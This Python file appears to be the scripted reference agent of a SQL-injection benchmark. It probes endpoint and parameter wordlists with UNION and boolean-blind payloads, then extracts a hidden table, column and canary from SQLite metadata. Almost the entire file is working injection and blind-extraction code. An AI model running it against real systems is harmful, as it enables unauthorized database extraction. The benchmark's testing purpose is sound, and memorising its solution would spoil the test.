from __future__ import annotations

"""secqurityVali/agents/reference_sqli/agent.py - a scripted SQLi solver.

The benchmark's own reference agent: it does, by hand, exactly what a miner's
agent is supposed to do -- find the injectable endpoint, read the (randomized)
schema through the injection, extract the canary, and write findings.json. It
uses no LLM; it is a fixed script, which is the right shape for a bounded task
like SQLi (see the LLM decision discussion).

It exists to prove two things: that the benchmark is solvable at all, and that
a competent agent's output scores as expected end to end. It also doubles as a
known-good agent for the sandbox and scoring tests.

It follows the agent contract: read TARGET_URL and OUTPUT_PATH from the
environment, and know nothing else -- not the canary, not which endpoint is
vulnerable, not the schema. Everything is discovered at runtime.

How it solves the challenge (a UNION-based SQL injection):

  1. Probe each candidate endpoint/parameter with a UNION that echoes a marker.
     The one that echoes the marker back is the injectable endpoint.
  2. Through it, read sqlite_master to list tables -> find the secret table
     (the one that isn't `products`).
  3. Read pragma_table_info to list that table's columns -> find the secret
     column (the one that isn't `id`).
  4. Select the secret column from the secret table -> the canary.
"""

import json
import os
import sys
import urllib.parse
import urllib.request

# The agent is given only these two things.
TARGET_URL = os.getenv("TARGET_URL", "http://127.0.0.1:8000").rstrip("/")
OUTPUT_PATH = os.getenv("OUTPUT_PATH", "/out/findings.json")
RUN_ID = os.getenv("RUN_ID", "")

# The agent's own wordlists -- what any scanner would carry. It does NOT know
# which endpoint or parameter is the real one; it tries them.
CANDIDATE_ENDPOINTS = [
    "/api/products", "/api/search", "/api/users", "/api/orders", "/api/lookup",
    "/api/items", "/api/inventory", "/api/report", "/api/accounts", "/api/catalog",
]
CANDIDATE_PARAMS = ["q", "id", "name", "filter", "query", "search"]

MARKER = "S1NJ3CT0K"


def _get(endpoint: str, param: str, value: str, timeout: float = 5.0) -> str:
    url = f"{TARGET_URL}{endpoint}?" + urllib.parse.urlencode({param: value})
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.read().decode("utf-8", "replace")
    except Exception:
        return ""


def _union(mid: str, from_clause: str = "") -> str:
    """A 3-column UNION payload (products has 3 columns): our value goes in the
    middle (name) column, an optional FROM/WHERE follows the column list, and
    `-- -` comments out the rest of the original query."""
    tail = f" {from_clause}" if from_clause else ""
    return f"' UNION SELECT 1, {mid}, 1{tail}-- -"


NAME_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_"
HEX_CHARSET = "0123456789abcdef"


def find_injectable() -> tuple[str, str, str] | None:
    """Return (endpoint, param, variant) for the injectable endpoint.

    Tries the union technique first (does our marker echo back in a row?), then
    the boolean-blind technique (does a true condition differ from a false one?).
    """
    union_payload = _union(f"'{MARKER}'")
    for endpoint in CANDIDATE_ENDPOINTS:
        for param in CANDIDATE_PARAMS:
            if MARKER in _get(endpoint, param, union_payload):
                return endpoint, param, "union"
            if _is_boolean_injectable(endpoint, param):
                return endpoint, param, "boolean"
    return None


# --- boolean-blind helpers ---------------------------------------------

def _btest(endpoint: str, param: str, condition: str) -> bool:
    """Ask the target a yes/no question via a boolean-blind OR injection: the
    response's `found` reflects `condition`."""
    payload = f"zzz' OR ({condition})-- -"
    body = _get(endpoint, param, payload)
    try:
        return bool(json.loads(body).get("found"))
    except (json.JSONDecodeError, AttributeError):
        return False


def _is_boolean_injectable(endpoint: str, param: str) -> bool:
    """Injectable via boolean blind iff a true condition yields found=true and a
    false one yields found=false."""
    return _btest(endpoint, param, "1=1") and not _btest(endpoint, param, "1=2")


def _blind_string(endpoint: str, param: str, subquery: str, charset: str,
                  max_len: int = 64) -> str:
    """Reconstruct the string value of `subquery` one character at a time using
    only true/false answers."""
    out = ""
    for i in range(1, max_len + 1):
        if not _btest(endpoint, param, f"length(({subquery})) >= {i}"):
            break
        found = None
        for c in charset:
            if _btest(endpoint, param, f"substr(({subquery}),{i},1)='{c}'"):
                found = c
                break
        if found is None:
            break
        out += found
    return out


def _extract_column(endpoint: str, param: str, mid: str, from_clause: str = "") -> list[str]:
    """Run a UNION that puts `mid` in the middle (name) column and collect the
    values it returns.

    The vulnerable query returns the real products too (the `LIKE '%'` matches
    everything), so injected rows are tagged with our marker and prefix-filtered
    -- otherwise product names would be mistaken for extracted data."""
    tagged = f"'{MARKER}:' || ({mid})"
    body = _get(endpoint, param, _union(tagged, from_clause))
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return []
    prefix = f"{MARKER}:"
    values = []
    for row in data.get("results", []):
        if isinstance(row, list) and len(row) >= 2 and isinstance(row[1], str):
            if row[1].startswith(prefix):
                values.append(row[1][len(prefix):])
    return values


def solve() -> dict | None:
    hit = find_injectable()
    if not hit:
        return None
    endpoint, param, variant = hit
    if variant == "boolean":
        return _solve_boolean(endpoint, param)
    return _solve_union(endpoint, param)


def _solve_boolean(endpoint: str, param: str) -> dict | None:
    """Blind extraction: find the secret table and column, then the canary,
    all through true/false answers."""
    table = _blind_string(
        endpoint, param,
        "SELECT name FROM sqlite_master WHERE type='table' AND name!='products' LIMIT 1",
        NAME_CHARSET,
    )
    if not table:
        return None
    column = _blind_string(
        endpoint, param,
        f"SELECT name FROM pragma_table_info('{table}') WHERE name!='id' LIMIT 1",
        NAME_CHARSET,
    )
    if not column:
        return None
    canary = _blind_string(
        endpoint, param, f'SELECT "{column}" FROM "{table}" LIMIT 1', HEX_CHARSET,
    )
    if not canary:
        return None
    return {
        "endpoint": endpoint,
        "parameter": param,
        "injection_type": "sql_injection",
        "payload": f"zzz' OR (substr((SELECT \"{column}\" FROM \"{table}\"),1,1)='?')-- -",
        "severity": "high",
        "confidence": 0.95,
        "evidence": {"canary": canary},
    }


def _solve_union(endpoint: str, param: str) -> dict | None:
    # 2. tables -> the secret table is the one that isn't products
    tables = _extract_column(
        endpoint, param, "name", "FROM sqlite_master WHERE type='table'"
    )
    secret_tables = [t for t in tables if t and t != "products"]
    if not secret_tables:
        return None
    secret_table = secret_tables[0]

    # 3. columns of that table -> the secret column is the one that isn't id
    cols = _extract_column(
        endpoint, param, "name", f"FROM pragma_table_info('{secret_table}')"
    )
    secret_cols = [c for c in cols if c and c != "id"]
    if not secret_cols:
        return None
    secret_column = secret_cols[0]

    # 4. extract the canary
    values = _extract_column(endpoint, param, f'"{secret_column}"', f'FROM "{secret_table}"')
    # the canary is the value that isn't an ordinary product name
    products = {"Widget", "Gadget", "Sprocket", "Cog"}
    canary_values = [v for v in values if v not in products]
    if not canary_values:
        return None
    canary = canary_values[0]

    payload = _union(f'"{secret_column}"', f'FROM "{secret_table}"')
    return {
        "endpoint": endpoint,
        "parameter": param,
        "injection_type": "sql_injection",
        "payload": payload,
        "severity": "high",
        "confidence": 0.99,
        "evidence": {"canary": canary},
    }


def build_findings(finding: dict | None) -> dict:
    return {
        "schema_version": "1.0",
        "run_id": RUN_ID,
        "agent": {"name": "reference-sqli", "version": "1.0.0"},
        "findings": [finding] if finding else [],
        "reproduction": (
            [{
                "finding_index": 0,
                "method": "GET",
                "path": finding["endpoint"],
                "query": {finding["parameter"]: finding["payload"]},
            }]
            if finding else []
        ),
    }


def main() -> int:
    finding = solve()
    doc = build_findings(finding)
    os.makedirs(os.path.dirname(OUTPUT_PATH) or ".", exist_ok=True)
    with open(OUTPUT_PATH, "w", encoding="utf-8") as fh:
        json.dump(doc, fh, indent=2)
    if finding:
        print(f"reference-sqli: found injection at {finding['endpoint']} "
              f"({finding['parameter']}), extracted canary")
        return 0
    print("reference-sqli: no injection found", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
